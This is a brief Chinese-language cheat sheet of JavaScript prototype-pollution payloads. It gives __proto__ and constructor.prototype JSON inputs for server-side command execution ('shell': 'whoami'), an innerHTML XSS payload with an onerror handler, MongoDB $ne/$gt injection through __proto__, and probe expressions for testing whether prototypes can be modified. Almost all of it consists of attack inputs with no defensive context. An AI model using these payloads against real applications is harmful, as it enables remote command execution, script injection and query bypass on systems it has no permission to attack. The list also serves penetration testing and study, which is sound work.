# 原型链污染

## 1. 服务端RCE

### 基础Payload

```javascript
{"__proto__": {"shell": "whoami"}}
{"constructor.prototype": {"shell": "whoami"}}
```

### JSON Merge

```javascript
Object.assign(target, source)
```

## 2. 客户端XSS

### DOM污染

```javascript
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```

## 3. NoSQL注入

### MongoDB

```javascript
{"__proto__": {"$ne": ""}}
{"__proto__": {"$gt": ""}}
```

## 4. 探测

```javascript
{}.__proto__.__proto__ // 是否可修改
{}.constructor.prototype // 构造函数
```
